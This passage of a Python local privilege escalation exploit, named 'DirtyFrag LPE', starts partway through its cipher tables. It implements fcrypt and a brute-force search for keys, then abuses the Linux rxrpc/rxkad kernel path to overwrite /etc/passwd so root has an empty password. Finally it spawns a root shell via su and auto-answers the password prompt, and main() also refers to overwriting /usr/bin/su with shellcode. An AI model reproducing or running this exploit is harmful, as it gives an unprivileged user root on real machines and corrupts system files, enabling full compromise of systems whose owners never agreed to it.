    0x45,0xf0,0xd8,0x8a,0x59,0x7c,0x57,0xc1,0x79,0xc7,0x34,0xd6,0x43,0xdf,0xe4,0x78,
    0x16,0x06,0xda,0x92,0x76,0x51,0xe1,0xd4,0x70,0x03,0xe0,0x2f,0x96,0x91,0x82,0x80,
])
_FC_S2_RAW = bytes([
    0xf0,0x37,0x24,0x53,0x2a,0x03,0x83,0x86,0xd1,0xec,0x50,0xf0,0x42,0x78,0x2f,0x6d,
    0xbf,0x80,0x87,0x27,0x95,0xe2,0xc5,0x5d,0xf9,0x6f,0xdb,0xb4,0x65,0x6e,0xe7,0x24,
    0xc8,0x1a,0xbb,0x49,0xb5,0x0a,0x7d,0xb9,0xe8,0xdc,0xb7,0xd9,0x45,0x20,0x1b,0xce,
    0x59,0x9d,0x6b,0xbd,0x0e,0x8f,0xa3,0xa9,0xbc,0x74,0xa6,0xf6,0x7f,0x5f,0xb1,0x68,
    0x84,0xbc,0xa9,0xfd,0x55,0x50,0xe9,0xb6,0x13,0x5e,0x07,0xb8,0x95,0x02,0xc0,0xd0,
    0x6a,0x1a,0x85,0xbd,0xb6,0xfd,0xfe,0x17,0x3f,0x09,0xa3,0x8d,0xfb,0xed,0xda,0x1d,
    0x6d,0x1c,0x6c,0x01,0x5a,0xe5,0x71,0x3e,0x8b,0x6b,0xbe,0x29,0xeb,0x12,0x19,0x34,
    0xcd,0xb3,0xbd,0x35,0xea,0x4b,0xd5,0xae,0x2a,0x79,0x5a,0xa5,0x32,0x12,0x7b,0xdc,
    0x2c,0xd0,0x22,0x4b,0xb1,0x85,0x59,0x80,0xc0,0x30,0x9f,0x73,0xd3,0x14,0x48,0x40,
    0x07,0x2d,0x8f,0x80,0x0f,0xce,0x0b,0x5e,0xb7,0x5e,0xac,0x24,0x94,0x4a,0x18,0x15,
    0x05,0xe8,0x02,0x77,0xa9,0xc7,0x40,0x45,0x89,0xd1,0xea,0xde,0x0c,0x79,0x2a,0x99,
    0x6c,0x3e,0x95,0xdd,0x8c,0x7d,0xad,0x6f,0xdc,0xff,0xfd,0x62,0x47,0xb3,0x21,0x8a,
    0xec,0x8e,0x19,0x18,0xb4,0x6e,0x3d,0xfd,0x74,0x54,0x1e,0x04,0x85,0xd8,0xbc,0x1f,
    0x56,0xe7,0x3a,0x56,0x67,0xd6,0xc8,0xa5,0xf3,0x8e,0xde,0xae,0x37,0x49,0xb7,0xfa,
    0xc8,0xf4,0x1f,0xe0,0x2a,0x9b,0x15,0xd1,0x34,0x0e,0xb5,0xe0,0x44,0x78,0x84,0x59,
    0x56,0x68,0x77,0xa5,0x14,0x06,0xf5,0x2f,0x8c,0x8a,0x73,0x80,0x76,0xb4,0x10,0x86,
])
_FC_S3_RAW = bytes([
    0xa9,0x2a,0x48,0x51,0x84,0x7e,0x49,0xe2,0xb5,0xb7,0x42,0x33,0x7d,0x5d,0xa6,0x12,
    0x44,0x48,0x6d,0x28,0xaa,0x20,0x6d,0x57,0xd6,0x6b,0x5d,0x72,0xf0,0x92,0x5a,0x1b,
    0x53,0x80,0x24,0x70,0x9a,0xcc,0xa7,0x66,0xa1,0x01,0xa5,0x41,0x97,0x41,0x31,0x82,
    0xf1,0x14,0xcf,0x53,0x0d,0xa0,0x10,0xcc,0x2a,0x7d,0xd2,0xbf,0x4b,0x1a,0xdb,0x16,
    0x47,0xf6,0x51,0x36,0xed,0xf3,0xb9,0x1a,0xa7,0xdf,0x29,0x43,0x01,0x54,0x70,0xa4,
    0xbf,0xd4,0x0b,0x53,0x44,0x60,0x9e,0x23,0xa1,0x18,0x68,0x4f,0xf0,0x2f,0x82,0xc2,
    0x2a,0x41,0xb2,0x42,0x0c,0xed,0x0c,0x1d,0x13,0x3a,0x3c,0x6e,0x35,0xdc,0x60,0x65,
    0x85,0xe9,0x64,0x02,0x9a,0x3f,0x9f,0x87,0x96,0xdf,0xbe,0xf2,0xcb,0xe5,0x6c,0xd4,
    0x5a,0x83,0xbf,0x92,0x1b,0x94,0x00,0x42,0xcf,0x4b,0x00,0x75,0xba,0x8f,0x76,0x5f,
    0x5d,0x3a,0x4d,0x09,0x12,0x08,0x38,0x95,0x17,0xe4,0x01,0x1d,0x4c,0xa9,0xcc,0x85,
    0x82,0x4c,0x9d,0x2f,0x3b,0x66,0xa1,0x34,0x10,0xcd,0x59,0x89,0xa5,0x31,0xcf,0x05,
    0xc8,0x84,0xfa,0xc7,0xba,0x4e,0x8b,0x1a,0x19,0xf1,0xa1,0x3b,0x18,0x12,0x17,0xb0,
    0x98,0x8d,0x0b,0x23,0xc3,0x3a,0x2d,0x20,0xdf,0x13,0xa0,0xa8,0x4c,0x0d,0x6c,0x2f,
    0x47,0x13,0x13,0x52,0x1f,0x2d,0xf5,0x79,0x3d,0xa2,0x54,0xbd,0x69,0xc8,0x6b,0xf3,
    0x05,0x28,0xf1,0x16,0x46,0x40,0xb0,0x11,0xd3,0xb7,0x95,0x49,0xcf,0xc3,0x1d,0x8f,
    0xd8,0xe1,0x73,0xdb,0xad,0xc8,0xc9,0xa9,0xa1,0xc2,0xc5,0xe3,0xba,0xfc,0x0e,0x25,
])

def _build_fc_sboxes():
    import sys as _sys
    big = (_sys.byteorder == "big")
    def be32(v):
        b = struct.pack(">I", v & 0xFFFFFFFF)
        return struct.unpack(">I" if big else "<I", b)[0]
    s0 = [be32(_FC_S0_RAW[i] << 3)  for i in range(256)]
    s1 = [be32(((_FC_S1_RAW[i] & 0x1f) << 27) | (_FC_S1_RAW[i] >> 5)) for i in range(256)]
    s2 = [be32(_FC_S2_RAW[i] << 11) for i in range(256)]
    s3 = [be32(_FC_S3_RAW[i] << 19) for i in range(256)]
    return s0, s1, s2, s3

_FC_S0, _FC_S1, _FC_S2, _FC_S3 = _build_fc_sboxes()


def fcrypt_setkey(key8: bytes):
    k = 0
    for b in key8:
        k = (k << 7) | (b >> 1)
    def ror56(v, n): return ((v >> n) | ((v & ((1 << n) - 1)) << (56 - n))) & ((1 << 56) - 1)
    sched = []
    for _ in range(16):
        sched.append(struct.pack(">I", k & 0xFFFFFFFF)[0:4])
        k = ror56(k, 11)
    return sched  # list of 16 x bytes(4)


def fcrypt_decrypt(sched, block8: bytes) -> bytes:
    L, R = struct.unpack_from(">II", block8)
    def F(R_, L_, s):
        val = struct.unpack(">I", s)[0] ^ R_
        c = [(val >> 24) & 0xFF, (val >> 16) & 0xFF,
             (val >>  8) & 0xFF,  val        & 0xFF]
        return L_ ^ (_FC_S0[c[0]] ^ _FC_S1[c[1]] ^ _FC_S2[c[2]] ^ _FC_S3[c[3]])
    order = [0xF,0xE,0xD,0xC,0xB,0xA,0x9,0x8,0x7,0x6,0x5,0x4,0x3,0x2,0x1,0x0]
    for i in order:
        if i % 2 == 0:  # even round: F(L,R,s[i]) → update R
            R = F(L, R, sched[i])
        else:
            L = F(R, L, sched[i])
    return struct.pack(">II", L, R)


def _splitmix64(s: int) -> tuple:
    s  = (s + 0x9E3779B97F4A7C15) & 0xFFFFFFFFFFFFFFFF
    z  = s
    z  = ((z ^ (z >> 30)) * 0xBF58476D1CE4E5B9) & 0xFFFFFFFFFFFFFFFF
    z  = ((z ^ (z >> 27)) * 0x94D049BB133111EB) & 0xFFFFFFFFFFFFFFFF
    return s, z ^ (z >> 31)


def _check_pa(P: bytes) -> bool:
    return P[0] == ord(":") and P[1] == ord(":")

def _check_pb(P: bytes) -> bool:
    return P[0] == ord("0") and P[1] == ord(":")

def _check_pc(P: bytes) -> bool:
    if P[0] != ord("0"): return False
    if P[1] != ord(":"): return False
    if P[7] != ord(":"): return False
    for i in range(2, 7):
        if P[i] in (ord(":"), 0, ord("\n")):
            return False
    return True


def find_key_offline(C8: bytes, max_iters: int, check_fn,
                     seed: int, label: str):
    t0 = time.monotonic()
    s  = seed
    for it in range(max_iters):
        s, r = _splitmix64(s)
        K = struct.pack("<Q", r)[:8]
        sch = fcrypt_setkey(K)
        P = fcrypt_decrypt(sch, C8)
        if check_fn(P):
            dt = time.monotonic() - t0
            log(f"{label} found after {it} iters in {dt:.2f}s  "
                f"K={K.hex()}  P={P.hex()}  \"{P.decode('latin1')}\"")
            return K, P
        if it & 0x3FFFFFF == 0 and it > 0:
            dt = time.monotonic() - t0
            print(f"  [{label} {dt:.1f}s] iter={it} ({it/dt/1e6:.2f}M/s)",
                  file=sys.stderr)
    return None, None


def stage2_rxrpc_lpe(argv):
    print("\n=== rxrpc/rxkad LPE EXPLOIT (uid=1000 → root) ===", file=sys.stderr)
    print(f"[*] uid={os.getuid()} euid={os.geteuid()} gid={os.getgid()}", file=sys.stderr)

    if os.getenv("POC_UNSHARE") == "1":
        do_unshare_userns_netns()

    # autoload rxrpc module
    try:
        dummy = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.PF_INET)
        dummy.close()
        log("rxrpc module autoloaded")
    except Exception as e:
        warn(f"socket(AF_RXRPC): {e} — module not loadable?")
        return 1

    target_path = os.getenv("POC_TARGET_FILE", "/etc/passwd")
    rfd = os.open(target_path, os.O_RDONLY)
    st  = os.fstat(rfd)
    if st.st_size < 32:
        warn(f"target too small: {st.st_size}")
        return 1
    log(f"target {target_path} opened, size={st.st_size}")

    # read current content
    def read_bytes(off, n):
        return os.pread(rfd, n, off)

    page = read_bytes(0, min(4096, st.st_size))
    print(f"[*] {target_path} line 1 BEFORE: '{page[:32].decode('latin1','replace')}'",
          file=sys.stderr)

    if page[:9] == b"root::0:0":
        log("/etc/passwd already patched — nothing to do")
        return 0

    # read ciphertexts
    Ca = read_bytes(4, 8)
    Cb = read_bytes(6, 8)
    Cc = read_bytes(8, 8)

    # fcrypt selftest
    sch0 = fcrypt_setkey(b"\x00"*8)
    ct   = bytes([0x0E,0x09,0x00,0xC7,0x3E,0xF7,0xED,0x41])
    pt   = fcrypt_decrypt(sch0, ct)
    if pt != b"\x00"*8:
        warn(f"fcrypt selftest FAILED: {pt.hex()}")
        return 1
    log("fcrypt selftest OK")

    max_iters = int(os.getenv("LPE_MAX_ITERS", "10000000000"))
    seed_base = (int(time.time()) * 0x100000001 ^ os.getpid()) & 0xFFFFFFFFFFFFFFFF
    if os.getenv("LPE_SEED"):
        seed_base = int(os.getenv("LPE_SEED"), 0)

    print("\n=== STAGE 1a: search K_A (chars 4-5 := \"::\") ===", file=sys.stderr)
    Ka, Pa = find_key_offline(Ca, max_iters, _check_pa,
                              seed_base, "K_A")
    if Ka is None:
        warn("K_A search exhausted"); return 2

    Cb_actual = Pa[2:8] + Cb[6:8]
    log(f"Cb_actual = {Cb_actual.hex()}")

    print("\n=== STAGE 1b: search K_B (chars 6-7 := \"0:\") ===", file=sys.stderr)
    Kb, Pb = find_key_offline(Cb_actual, max_iters, _check_pb,
                              seed_base ^ 0xa5a5a5a5a5a5a5a5, "K_B")
    if Kb is None:
        warn("K_B search exhausted"); return 2

    Cc_actual = Pb[2:8] + Cc[6:8]
    log(f"Cc_actual = {Cc_actual.hex()}")

    print("\n=== STAGE 1c: search K_C (chars 8-15 := \"0:GGGGGG:\") ===", file=sys.stderr)
    Kc, Pc = find_key_offline(Cc_actual, max_iters, _check_pc,
                              seed_base ^ 0x5a5a5a5a5a5a5a5a, "K_C")
    if Kc is None:
        warn("K_C search exhausted"); return 2

    print(f"\n[+] Predicted: 'root{Pa[:2].decode()}{Pb[:2].decode()}"
          f"{Pc[:8].decode()}/root:/bin/bash'", file=sys.stderr)

    global SESSION_KEY

    print(f"\n=== STAGE 2a: kernel trigger A @ off 4 ===", file=sys.stderr)
    SESSION_KEY[:] = Ka
    if not do_one_trigger(rfd, 4, 8):
        warn("kernel trigger A failed"); return 3

    print(f"\n=== STAGE 2b: kernel trigger B @ off 6 ===", file=sys.stderr)
    SESSION_KEY[:] = Kb
    if not do_one_trigger(rfd, 6, 8):
        warn("kernel trigger B failed"); return 3

    print(f"\n=== STAGE 2c: kernel trigger C @ off 8 ===", file=sys.stderr)
    SESSION_KEY[:] = Kc
    if not do_one_trigger(rfd, 8, 8):
        warn("kernel trigger C failed"); return 3

    # verify
    page_after = os.pread(rfd, 32, 0)
    print(f"[*] {target_path} line 1 AFTER: '{page_after.decode('latin1','replace')}'",
          file=sys.stderr)
    m = page_after
    ok = (m[4]==ord(":") and m[5]==ord(":") and
          m[6]==ord("0") and m[7]==ord(":") and
          m[8]==ord("0") and m[9]==ord(":") and
          m[15]==ord(":"))
    if not ok:
        warn("post-trigger sanity check failed")
        return 4

    print("\n[!!!] HIT — root entry has empty passwd field, uid=0", file=sys.stderr)

    if "--corrupt-only" in argv or os.getenv("DIRTYFRAG_CORRUPT_ONLY") == "1":
        return 0

    # === STAGE 4: spawn root shell via su ===
    print("\n=== STAGE 4: spawning root shell via `su` ===\n", file=sys.stderr)
    master, slave = pty.openpty()

    pid = os.fork()
    if pid == 0:
        os.setsid()
        fcntl.ioctl(slave, termios.TIOCSCTTY, 0)
        os.dup2(slave, 0); os.dup2(slave, 1); os.dup2(slave, 2)
        if slave > 2: os.close(slave)
        os.close(master)
        os.execvp("su", ["su"])
        os._exit(127)

    old_attrs = termios.tcgetattr(sys.stdin.fileno())
    try:
        tty_attrs = termios.tcgetattr(sys.stdin.fileno())
        tty_attrs[3] &= ~(termios.ECHO | termios.ICANON)
        termios.tcsetattr(sys.stdin.fileno(), termios.TCSANOW, tty_attrs)
    except Exception:
        old_attrs = None

    auto_pw_sent = False
    stdin_eof    = False

    try:
        while True:
            rfds = [master]
            if not stdin_eof:
                rfds.append(sys.stdin.fileno())
            r, _, _ = select.select(rfds, [], [], 0.2)

            if master in r:
                try:
                    data = os.read(master, 4096)
                    os.write(sys.stdout.fileno(), data)
                    if not auto_pw_sent and b"assword" in data:
                        os.write(master, b"\n")
                        auto_pw_sent = True
                except OSError:
                    break

            if not stdin_eof and sys.stdin.fileno() in r:
                data = os.read(sys.stdin.fileno(), 4096)
                if not data:
                    stdin_eof = True
                else:
                    os.write(master, data)

            p, s = os.waitpid(pid, os.WNOHANG)
            if p:
                break
    finally:
        if old_attrs:
            termios.tcsetattr(sys.stdin.fileno(), termios.TCSANOW, old_attrs)
        os.close(master)

    return 0


# ── main ──────────────────────────────────────────────────────────────────────
def main():
    global verbose
    argv = sys.argv[1:]

    if "-v" in argv or "--verbose" in argv or os.getenv("DIRTYFRAG_VERBOSE"):
        verbose = True

    print("=== DirtyFrag LPE (Python3 port) ===", file=sys.stderr)
    print(f"[*] uid={os.getuid()} euid={os.geteuid()}", file=sys.stderr)

    # Stage 1: xfrm → overwrite /usr/bin/su with shellcode ELF
    rc = stage1_su_lpe(argv)
    if rc != 0:
        warn(f"Stage 1 failed (rc={rc})")
        sys.exit(rc)

    # Stage 2: rxrpc → corrupt /etc/passwd → spawn root shell
    rc = stage2_rxrpc_lpe(argv)
    sys.exit(rc)


if __name__ == "__main__":
    main()
